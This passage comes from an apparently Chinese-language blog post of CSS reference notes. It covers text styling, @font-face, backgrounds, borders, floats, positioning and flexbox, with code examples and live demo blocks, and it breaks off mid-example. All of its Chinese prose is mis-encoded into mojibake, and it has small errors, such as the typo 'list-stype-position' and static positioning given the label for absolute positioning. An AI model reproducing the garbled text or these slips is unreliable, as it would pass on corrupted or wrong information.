word-spacing(å•è¯é—´è·)<br>font-style  : normal, italicæ–œä½“, oblique<br>font-weight : normal, bold, lighter, bolder<br>text-transform : none, uppercase, lowercase, capitalize, full-width<br>text-decoration: none, underline, overline, line-through<br>text-shadow: 4px 4px 5px red (æ°´å¹³åç§», å‚ç›´åç§», æ¨¡ç³ŠåŠå¾„, é¢œè‰²ï¼Œé€—å·åˆ†éš”å¤šä¸ªé˜´å½±å€¼å¯ç”¨äºåŒä¸€æ–‡æœ¬)<br>text-align: left, right, center, justify(ä½¿æ–‡æœ¬å±•å¼€)<br>@font-face: ä½¿ç”¨å­—ä½“æ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">  font-family: &apos;ciclefina&apos;;</span><br><span class="line">  src: url(&apos;fonts/cicle_fina-webfont.eot&apos;);</span><br><span class="line">  src: url(&apos;fonts/cicle_fina-webfont.eot?#iefix&apos;) format(&apos;embedded-opentype&apos;),</span><br><span class="line">         url(&apos;fonts/cicle_fina-webfont.woff2&apos;) format(&apos;woff2&apos;),</span><br><span class="line">         url(&apos;fonts/cicle_fina-webfont.woff&apos;) format(&apos;woff&apos;),</span><br><span class="line">         url(&apos;fonts/cicle_fina-webfont.ttf&apos;) format(&apos;truetype&apos;),</span><br><span class="line">         url(&apos;fonts/cicle_fina-webfont.svg#ciclefina&apos;) format(&apos;svg&apos;);</span><br><span class="line">  font-weight: normal;</span><br><span class="line">  font-style: normal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em><code>æ–‡æœ¬å¸ƒå±€</code></em><br>text-indent<br><strong>text-overflow</strong>: æº¢å‡ºå†…å®¹æ˜¾ç¤ºç¬¦å·ã€‚clip è¢«å‰ªåˆ‡ / ellipsis çœç•¥å·<br><strong>white-space</strong>: å¤„ç†å…ƒç´ ä¸­çš„ç©ºç™½ã€‚ normal è¿ç»­çš„ç©ºç™½ç¬¦ä¼šè¢«åˆå¹¶,å¿…è¦æ—¶ä¼šæ¢è¡Œ / pre / nowrap / pre-wrap è¿ç»­çš„ç©ºç™½ç¬¦ä¼šè¢«ä¿ç•™ï¼Œå¿…è¦æ—¶ä¼šæ¢è¡Œ / pre-line<br><strong>word-break</strong>: æŒ‡å®šå•è¯å†…æ–­è¡Œã€‚normal é»˜è®¤çš„æ–­è¡Œè§„åˆ™ï¼Œä¸­æ–‡åˆ°è¾¹ç•Œä¸Šçš„æ±‰å­—æ¢è¡Œï¼Œ / break-all å¯åœ¨ä»»æ„å­—ç¬¦é—´æ–­è¡Œ / keep-all<br><strong>word-wrap</strong>: å½“ä¸€ä¸ªä¸èƒ½è¢«åˆ†å¼€çš„å­—ç¬¦ä¸²å¤ªé•¿è€Œä¸èƒ½å¡«å……å…¶åŒ…è£¹ç›’æ—¶ï¼Œä¸ºé˜²æ­¢æº¢å‡ºï¼Œæ˜¯å¦è¿™æ ·çš„å•è¯ä¸­æ–­æ¢è¡Œã€‚ normal å•è¯ç»“æŸå¤„æ¢è¡Œ / break-word å¼ºåˆ¶åˆ‡å‰²æ¢è¡Œ<br><strong>text-align-last</strong>: æœ€åä¸€è¡Œæ–‡æœ¬çš„å¯¹é½è§„åˆ™ã€‚ auto / start / end / left / right / center / justify</p><p><em><code>åˆ—è¡¨ - ul</code></em><br><strong>list-style-type</strong> : åˆ—è¡¨ç¬¦å·çš„ç±»å‹ã€‚disc å®å¿ƒåŸç‚¹ / circle ç©ºå¿ƒåŸç‚¹ / square å®å¿ƒæ–¹å— / decimal æ•°å­—1,2 / decimal-leading-zero æ•°å­—01,02 / lower-roman  i, ii / upper-roman I, II / lower-greek Î±, Î², Î³ / lower-alpha a,b,c / upper-alpha A,B,C<br><strong>list-stype-position</strong> : åˆ—è¡¨ç¬¦å·åœ¨ç›’å†…è¿˜æ˜¯ç›’å¤–ã€‚inside / outside<br><strong>list-style-image</strong>: url(â€˜1.pngâ€™)</p><p><br></p><h3 id="3-åŒºå—"><a href="#3-åŒºå—" class="headerlink" title="3. åŒºå—"></a>3. åŒºå—</h3><p><em><code>èƒŒæ™¯</code></em><br>é»˜è®¤æƒ…å†µä¸‹ï¼ŒèƒŒæ™¯ä¼šå»¶ä¼¸åˆ°è¾¹æ¡†æ‰€åœ¨çš„åŒºåŸŸä¸‹å±‚ã€‚<br>background-color<br><strong>background-image</strong>: url(â€˜1.pngâ€™) / æ¸å˜ linear-gradient(æ¸å˜çš„æ–¹å‘, å¼€å§‹çš„é¢œè‰², ç»“å°¾çš„é¢œè‰²) to bottom, to right, to bottom right<br><strong>background-repeat</strong>: æŒ‡å®šèƒŒæ™¯å›¾åƒå¦‚ä½•é‡å¤ã€‚ no-repeat / repeat-x / repeat-y / repeat<br><strong>background-position</strong>: æŒ‡å®šå›¾åƒ(x,y)åæ ‡. 200px 25px / 10% 20% / ä½¿ç”¨å…³é”®å­— [left,center,right], [top,center,bottom]<br><strong>background-attachment</strong>: è®¾ç½®å…ƒç´ èƒŒæ™¯å›¾ç‰‡æ˜¯å¦å›ºå®šæˆ–è€…éšç€é¡µé¢çš„å…¶ä½™éƒ¨åˆ†æ»šåŠ¨ï¼Œä¸€èˆ¬è¿ç”¨åœ¨htmlæˆ–bodyä¸Š scroll / fixed<br><strong>background-size</strong>: è°ƒæ•´èƒŒæ™¯å›¾åƒå¤§å°ã€‚auto å›¾ç‰‡åŸå§‹å®½é«˜ / <code>&lt;length&gt;&lt;percentage&gt;</code> å…·ä½“å®½é«˜ / cover å®Œå…¨è¦†ç›–èƒŒæ™¯åŒºï¼Œå›¾åƒæ¯”ä¾‹ä¸å˜ï¼Œå›¾ç‰‡éƒ¨åˆ†çœ‹ä¸è§ / contain å•è¾¹è¦†ç›–èƒŒæ™¯åŒºï¼Œå›¾åƒæ¯”ä¾‹ä¸å˜ï¼ŒèƒŒæ™¯åŒºéƒ¨åˆ†ç©ºç™½</p><p><em><code>è¾¹æ¡†</code></em><br>border, border-width, border-color, border-radius, border-image<br>border-style: none/ hidden / solid / dashed / dotted / double / groove / ridge / inset / outset / inherit</p><p><em><code>è¡¨æ ¼</code></em><br>table-layout: fixed, åˆ›å»ºå¯é¢„æµ‹çš„è¡¨å¸ƒå±€ï¼Œåœ¨æ ‡é¢˜è®¾ç½®widthè®¾ç½®åˆ—çš„å®½åº¦<br>border-collapse: collapse, ä½¿è¡¨å…ƒç´ è¾¹æ¡†åˆå¹¶</p><p><em><code>é«˜çº§åŒºå—æ•ˆæœ</code></em><br>box-shadow: 5px 5px 5px rgba(0,0,0,.7) æ°´å¹³åç§»é‡,å‚ç›´åç§»é‡,æ¨¡ç³ŠåŠå¾„,é¢œè‰²<br>box-shadow: inset 5px 5px 5px rgba(0,0,0,.7) <strong>inset</strong> å®šä¹‰å†…éƒ¨é˜´å½±<br>background-blend-mode: å°†å•ä¸ªå…ƒç´ çš„å¤šé‡èƒŒæ™¯å›¾ç‰‡å’ŒèƒŒæ™¯é¢œè‰²è®¾ç½®æ··åˆåœ¨ä¸€èµ·<br>mix-blend-mode: å°†ä¸€ä¸ªå…ƒç´ ä¸å®ƒè¦†ç›–çš„é‚£äº›å…ƒç´ å„è‡ªè®¾ç½®çš„èƒŒæ™¯å’Œå†…å®¹æ··åˆåœ¨ä¸€èµ·ã€‚normal | multiply | screen | overlay | darken | lighten | color-dodge | color-burn | hard-light | soft-light | difference | exclusion | hue | saturation | color | luminosity</p><p><br></p><h3 id="4-æ’ç‰ˆ"><a href="#4-æ’ç‰ˆ" class="headerlink" title="4. æ’ç‰ˆ"></a>4. æ’ç‰ˆ</h3><p>æ­£å¸¸å¸ƒå±€æµ: position:staticï¼Œæ˜¯æŒ‡åœ¨ä¸å¯¹é¡µé¢è¿›è¡Œä»»ä½•å¸ƒå±€æ§åˆ¶æ—¶ï¼Œæµè§ˆå™¨é»˜è®¤çš„HTMLå¸ƒå±€æ–¹å¼ã€‚<br><br></p><h4 id="4-1-æµ®åŠ¨"><a href="#4-1-æµ®åŠ¨" class="headerlink" title="4.1 æµ®åŠ¨"></a>4.1 æµ®åŠ¨</h4><p>float:left/right/none/inheritã€‚æµ®åŠ¨å…ƒç´ ä¼šè„±ç¦»æ­£å¸¸çš„æ–‡æ¡£å¸ƒå±€æµï¼Œå¹¶å¸é™„åˆ°å…¶çˆ¶å®¹å™¨çš„å·¦è¾¹(float:left)ã€‚åœ¨æ­£å¸¸å¸ƒå±€ä¸­ä½äºè¯¥æµ®åŠ¨å…ƒç´ ä¹‹ä¸‹çš„å†…å®¹ï¼Œæ­¤æ—¶ä¼šå›´ç»•ç€æµ®åŠ¨å…ƒç´ ï¼Œå¡«æ»¡å…¶å³ä¾§çš„ç©ºé—´ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// é¦–å­—æ¯ä¸‹æ²‰</span><br><span class="line">p::first-letter&#123;</span><br><span class="line">  font-size: 3rem;</span><br><span class="line">  float: left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em>æ¸…é™¤æµ®åŠ¨</em>: æ‰€æœ‰åœ¨æµ®åŠ¨ä¸‹é¢çš„è‡ªèº«ä¸æµ®åŠ¨çš„å†…å®¹éƒ½å°†å›´ç»•æµ®åŠ¨å…ƒç´ è¿›è¡ŒåŒ…è£…ã€‚å¦‚æœæ²¡æœ‰å¤„ç†è¿™äº›å…ƒç´ ï¼Œå°±ä¼šå˜å¾—å¾ˆç³Ÿç³•ã€‚<code>{ clear: both }</code>å½“æŠŠè¿™ä¸ªåº”ç”¨åˆ°ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œæ„å‘³ç€â€œæ­¤å¤„åœæ­¢æµ®åŠ¨â€ã€‚<br><br></p><h4 id="4-2-å®šä½"><a href="#4-2-å®šä½" class="headerlink" title="4.2 å®šä½"></a>4.2 å®šä½</h4><p>ç»å¯¹å®šä½(Static positioning)ï¼šå…ƒç´ åœ¨æ–‡æ¡£å¸ƒå±€æµçš„é»˜è®¤ä½ç½®<br>ç›¸å¯¹å®šä½(Relative positioning): åœ¨æ­£å¸¸æ–‡æ¡£æµä¸­çš„ä½ç½®è¿›è¡Œç›¸å¯¹ç§»åŠ¨<br>ç»å¯¹å®šä½(Absolute positioning): å°†å…ƒç´ å®Œå…¨ä»é¡µé¢çš„æ­£å¸¸å¸ƒå±€æµä¸­ç§»å‡ºã€‚å…ƒç´ ç›¸å¯¹æœ€è¿‘è¢«å®šä½çš„ç¥–å…ˆå…ƒç´ å›ºå®šã€‚<br>å›ºå®šå®šä½(Fixed positioning): å°†å…ƒç´ å®Œå…¨ä»é¡µé¢çš„æ­£å¸¸å¸ƒå±€æµä¸­ç§»å‡ºã€‚å°†ä¸€ä¸ªå…ƒç´ ç›¸å¯¹æµè§ˆå™¨è§†å£å›ºå®šã€‚<br><br></p><h4 id="4-3-flexå¸ƒå±€"><a href="#4-3-flexå¸ƒå±€" class="headerlink" title="4.3 flexå¸ƒå±€"></a>4.3 flexå¸ƒå±€</h4><p>æ”¯æŒæµè§ˆå™¨ Chrome 21+, Opera 12.1+, Firefox 22+, Safari 6.1+, IE 10+ã€‚</p><p>é‡‡ç”¨flexå¸ƒå±€çš„å…ƒç´ ï¼Œç§°ä¸ºflexå®¹å™¨ã€‚å®ƒçš„æ‰€æœ‰å­å…ƒç´ è‡ªåŠ¨æˆä¸ºå®¹å™¨æˆå‘˜ï¼Œå­å…ƒç´ çš„float, clearå’Œvertical-alignå±æ€§å°†å¤±æ•ˆã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  display: inline-flex;   // è¡Œå†…å…ƒç´ ä¹Ÿå¯ä»¥ä½¿ç”¨flex</span><br><span class="line">  display: -webkit-flex;  // å…¼å®¹Safari</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å®¹å™¨å­˜åœ¨ä¸¤æ ¹è½´ï¼šæ°´å¹³çš„ä¸»è½´(main axis)å’Œå‚ç›´çš„äº¤å‰è½´(cross axis)ã€‚ä¸»è½´çš„å¼€å§‹ä½ç½®å«<code>main start</code>ï¼Œ ç»“æŸä½ç½®å«<code>main end</code>ï¼Œ äº¤å‰è½´å¼€å§‹ä½ç½®å«<code>cross start</code>ï¼Œ ç»“æŸä½ç½®å«<code>cross end</code>ã€‚<br><img src="/2018/10/06/CSSæ–‡æ¡£/4.png" style="max-width:500px"></p><p><br></p><h5 id="4-3-1-å®¹å™¨çš„å±æ€§"><a href="#4-3-1-å®¹å™¨çš„å±æ€§" class="headerlink" title="4.3.1 å®¹å™¨çš„å±æ€§"></a>4.3.1 å®¹å™¨çš„å±æ€§</h5><ul><li>flex-direction: å†³å®šä¸»è½´çš„æ–¹å‘<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  flex-direction: row | row-reverse | column | column-reverse </span><br><span class="line">&#125;</span><br><span class="line">// row(é»˜è®¤å€¼)     ä¸»è½´ä¸ºæ°´å¹³æ–¹å‘ï¼Œèµ·ç‚¹åœ¨å·¦ç«¯</span><br><span class="line">// row-reverse    ä¸»è½´ä¸ºæ°´å¹³æ–¹å‘ï¼Œèµ·ç‚¹åœ¨å³ç«¯</span><br><span class="line">// column         ä¸»è½´ä¸ºå‚ç›´æ–¹å‘ï¼Œèµ·ç‚¹åœ¨ä¸Šæ–¹</span><br><span class="line">// column-reverse ä¸»è½´ä¸ºå‚ç›´é˜²çº¿ï¼Œèµ·ç‚¹åœ¨ä¸‹æ–¹</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSSæ–‡æ¡£/5.png" style="max-width:500px"></p><p><br></p><ul><li>flex-wrap: å¦‚æœä¸€æ¡è½´çº¿æ’ä¸ä¸‹ï¼Œå¦‚ä½•æ¢è¡Œ<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  flex-wrap: nowrap | wrap | wrap-reverse;</span><br><span class="line">&#125;</span><br><span class="line">// nowrap       ä¸æ¢è¡Œ</span><br><span class="line">// wrap         æ¢è¡Œï¼Œç¬¬ä¸€è¡Œåœ¨ä¸Šæ–¹</span><br><span class="line">// wrap-reverse æ¢è¡Œï¼Œç¬¬ä¸€è¡Œåœ¨ä¸‹æ–¹</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSSæ–‡æ¡£/6.png" style="max-width:500px"><br><img src="/2018/10/06/CSSæ–‡æ¡£/7.png" style="max-width:500px"><br><img src="/2018/10/06/CSSæ–‡æ¡£/8.jpg" style="max-width:500px"><br><br></p><ul><li><p>flex-flow: æ˜¯flex-directionå±æ€§å’Œflex-wrapå±æ€§çš„ç®€å†™æ¨¡å¼ï¼Œé»˜è®¤å€¼ä¸ºrow nowrapã€‚</p></li><li><p>justify-content: é¡¹ç›®åœ¨ä¸»è½´ä¸Šçš„å¯¹é½æ–¹å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  justify-content: flex-start | flex-end | center | space-between | space-around;</span><br><span class="line">&#125;</span><br><span class="line">// flex-start(é»˜è®¤å€¼)  å·¦å¯¹é½</span><br><span class="line">// flex-end           å³å¯¹é½</span><br><span class="line">// center             å±…ä¸­</span><br><span class="line">// space-between      ä¸¤ç«¯å¯¹é½ï¼Œé¡¹ç›®ä¹‹é—´çš„é—´éš”éƒ½ç›¸ç­‰</span><br><span class="line">// space-around       æ¯ä¸ªé¡¹ç›®ä¸¤ä¾§éƒ½ç›¸ç­‰</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSSæ–‡æ¡£/9.png" style="max-width:500px"></p><p><br></p><ul><li>align-items: é¡¹ç›®åœ¨äº¤å‰è½´ä¸Šå¦‚ä½•å¯¹é½<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  align-items: flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br><span class="line">// flex-start     äº¤å‰è½´çš„èµ·ç‚¹å¯¹é½</span><br><span class="line">// flex-end       äº¤å‰è½´çš„ç»ˆç‚¹å¯¹é½</span><br><span class="line">// center         äº¤å‰è½´çš„ä¸­ç‚¹å¯¹é½</span><br><span class="line">// baseline       é¡¹ç›®ç¬¬ä¸€è¡Œæ–‡å­—çš„åŸºçº¿å¯¹é½</span><br><span class="line">// stretch(é»˜è®¤å€¼) å¦‚æœé¡¹ç›®æœªè®¾ç½®é«˜åº¦æˆ–ä¸ºautoï¼Œå°†å æ»¡æ•´ä¸ªå®¹å™¨çš„é«˜åº¦</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSSæ–‡æ¡£/10.png" style="max-width:500px"></p><ul><li>align-content: å®šä¹‰äº†å¤šæ ¹è½´çº¿çš„å¯¹é½æ–¹å¼ã€‚</li></ul><p><br></p><h5 id="4-3-2-é¡¹ç›®çš„å±æ€§"><a href="#4-3-2-é¡¹ç›®çš„å±æ€§" class="headerlink" title="4.3.2 é¡¹ç›®çš„å±æ€§"></a>4.3.2 é¡¹ç›®çš„å±æ€§</h5><ul><li>order: å®šä¹‰é¡¹ç›®çš„æ’åˆ—é¡ºåºã€‚æ•°å€¼è¶Šå°ï¼Œæ’åˆ—è¶Šé å‰ï¼Œé»˜è®¤ä¸º0.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.item&#123;</span><br><span class="line">  order: &lt;integer&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSSæ–‡æ¡£/11.png" style="max-width:500px"><br><br></p><ul><li>flex-grow: å®šä¹‰é¡¹ç›®çš„æ”¾å¤§æ¯”ä¾‹ï¼Œé»˜è®¤ä¸º0ã€‚å¦‚æœé¡¹ç›®çš„<code>flex-grow</code>å±æ€§éƒ½ä¸º1ï¼Œåˆ™å®ƒä»¬å°†ç­‰åˆ†å‰©ä½™ç©ºé—´ã€‚å¦‚æœä¸€ä¸ªé¡¹ç›®çš„<code>flex-grow</code>å±æ€§ä¸º2ï¼Œå…¶ä½™ä¸º1ï¼Œåˆ™å‰è€…å æ®çš„å‰©ä½™ç©ºé—´å°†æ¯”å…¶ä»–é¡¹å¤šä¸€å€ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.item&#123;</span><br><span class="line">  flex-grow: &lt;number&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSSæ–‡æ¡£/12.png" style="max-width:500px"></p><ul><li>flex-shrink: å®šä¹‰äº†é¡¹ç›®çš„ç¼©å°æ¯”ä¾‹ï¼Œé»˜è®¤ä¸º1ã€‚å¦‚æœç©ºé—´ä¸è¶³ï¼Œé¡¹ç›®å°†ç¼©å°ã€‚å¦‚æœé¡¹ç›®çš„<code>flex-shrink</code>å±æ€§éƒ½ä¸º1ï¼Œå½“ç©ºé—´ä¸è¶³æ—¶ï¼Œéƒ½å°†ç­‰æ¯”ä¾‹ç¼©å°ã€‚å¦‚æœä¸€ä¸ªé¡¹ç›®çš„<code>flex-shrink</code>å±æ€§ä¸º0ï¼Œå…¶ä»–é¡¹ç›®ä¸ºéƒ½ä¸º1ï¼Œç©ºé—´ä¸è¶³æ—¶ï¼Œå‰è€…ä¸ç¼©å°ã€‚<br><img src="/2018/10/06/CSSæ–‡æ¡£/13.jpg" style="padding-top:20px;max-width:500px"><br><br></li><li><p>flex-basis: å®šä¹‰äº†åœ¨åˆ†é…å¤šä½™ç©ºé—´ä¹‹å‰ï¼Œé¡¹ç›®å æ®çš„ä¸»è½´ç©ºé—´ã€‚æµè§ˆå™¨æ ¹æ®è¿™ä¸ªå±æ€§ï¼Œè®¡ç®—ä¸»è½´æ˜¯å¦æœ‰å¤šä½™ç©ºé—´ã€‚å®ƒçš„é»˜è®¤å€¼ä¸ºautoï¼Œå³é¡¹ç›®çš„æœ¬æ¥å¤§å°ã€‚</p></li><li><p>flex: æ˜¯<code>flex-grow, flex-shrink å’Œ flex-basis</code>çš„ç®€å†™ï¼Œé»˜è®¤å€¼ä¸º<code>0 1 auto</code>ã€‚ </p></li><li><p>align-self: å…è®¸å•ä¸ªé¡¹ç›®æœ‰ä¸å…¶ä»–é¡¹ç›®ä¸ä¸€æ ·çš„å¯¹é½æ–¹å¼ï¼Œå¯è¦†ç›–<code>align-items</code>å±æ€§ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.item&#123;</span><br><span class="line">  align-self: auto | flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-4-flexå¸ƒå±€å®ä¾‹"><a href="#4-4-flexå¸ƒå±€å®ä¾‹" class="headerlink" title="4.4 flexå¸ƒå±€å®ä¾‹"></a>4.4 flexå¸ƒå±€å®ä¾‹</h4><ul><li>ç½‘æ ¼å¸ƒå±€ï¼Œå¹³å‡åˆ†å¸ƒ<style>.box{  width:100%;  height:50px;  display:flex;  margin-top:10px;  background:#f6f6f6;}.item{  background:#fff;  margin:10px;  flex:1;}</style><div class="box">  <div class="item"></div>  <div class="item"></div>  <div class="item"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br><span class="line">.item&#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;item&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;div class=&quot;item&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;div class=&quot;item&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>ç™¾åˆ†æ¯”å¸ƒå±€<style>.box{  width:100%;  height:50px;  display:flex;  margin-top:10px;  background:#f6f6f6;  text-align:center;}.item1{  background:#fff;  margin:10px;  flex:0 0 25%;}.item2{  background:#fff;  margin:10px;  flex:1;}</style><div class="box">  <div class="item1">1/4</div>  <div class="item2">auto</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  display:flex;</span><br><span class="line">&#125;</span><br><span class="line">.item1&#123;</span><br><span class="line">  flex:0 0 25%;</span><br><span class="line">&#125;</span><br><span class="line">.item2&#123;</span><br><span class="line">  flex:1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>åœ£æ¯å¸ƒå±€ï¼š é¡µé¢ä»ä¸Šåˆ°ä¸‹ï¼Œåˆ†æˆheader, body, footerã€‚å…¶bodyä»å·¦åˆ°å³åˆåˆ†ä¸ºå¯¼èˆªï¼Œä¸»æ ï¼Œå‰¯æ ã€‚<br>å›ºå®šçš„åº•æ ï¼šé¡µé¢å†…å®¹å¤ªå°‘ï¼Œæ— æ³•å æ»¡ä¸€å±çš„é«˜åº¦ï¼Œåº•æ å°±ä¼šæŠ¬é«˜åˆ°é¡µé¢çš„ä¸­é—´ï¼Œè¿™æ—¶å¯ä»¥é‡‡ç”¨è¯¥å¸ƒå±€ã€‚<style>.box1{  display: flex;  display: -ms-flexbox;  min-height: 200px;  flex-direction: column;  -ms-flex-direction: column;  margin-top: 10px;  background:#f6f6f6;  text-align: center;  padding:10px;}.box1 div{  background: #fff;}.box1 .box1-container{  background: #f6f6f6;}.box1 .box1-header{  flex:0 0 20px;  -ms-flex: 0 0 20px;}.box1 .box1-footer{  flex:0 0 20px;  -ms-flex: 0 0 20px;}.box1-container{  flex: 1;  display:flex;  margin: 10px 0;}.box1-aside{  order: -1;  flex: 0 0 50px;  margin-right: 10px;}.box1-right-aside{  order: 1;  flex: 0 0 100px;  margin-left: 10px;}.box1-content{  flex: 1;  -ms-flex: 1;}</style><div class="box1">  <div class="box1-header">header</div>  <div class="box1-container">    <div class="box1-aside">aside</div>    <div class="box1-content">content</div>    <div class="box1-right-aside">right-aside</div>  </div>    <div class="box1-footer">footer</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.app&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br><span class="line">.box&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  min-height: 100vh;</span><br><span class="line">  flex-direction: column;</span><br><span class="line">  width: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.header, .footer&#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">&#125;</span><br><span class="line">.container&#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br><span class="line">.aside, .right-aside&#123;</span><br><span class="line">  flex: 0 0 100px;</span><br><span class="line">&#125;</span><br><span class="line">.content&#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;app&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;header&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;aside&quot;&gt;aside&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;content&quot;&gt;content&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;right-aside&quot;&gt;right-aside&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;footer&quot;&gt;footer&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><p>æµå¼å¸ƒå±€: æ¯è¡Œçš„é¡¹ç›®æ•°å›ºå®šï¼Œä¼šè‡ªåŠ¨åˆ†è¡Œ</p><style>.parent {  width: 100%;  height: 150px;  background-color: #f6f6f6;  display: flex;  flex-flow: row wrap;  padding: 10px;}.child {  box-sizing: border-box;  background-color: #fff;  flex: 0 0 30%;  height: 50px;  margin: 10px 1.5% 0;}</style><div class="parent">  <div class="child"></div>  <div class="child"></div>  <div class="child"></div>  <div class="child"></div>  <div class="child"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.parent &#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 150px;</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-flow: row wrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.child &#123;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">  flex: 0 0 